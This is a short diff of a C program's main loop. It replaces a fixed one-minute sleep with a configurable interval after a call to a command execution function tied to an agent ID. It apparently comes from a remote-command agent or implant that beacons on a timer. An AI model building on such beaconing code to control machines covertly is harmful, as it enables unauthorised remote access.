@@ -90,7 +90,7 @@ int main() {
         execution_setup(agent_id); // Call the command execution function
 
         //WhisperSleep(get_sleep_time());
-        WhisperSleep(1000 * 60);
+        WhisperSleep(1000 * get_sleep_time());
 
     }
 
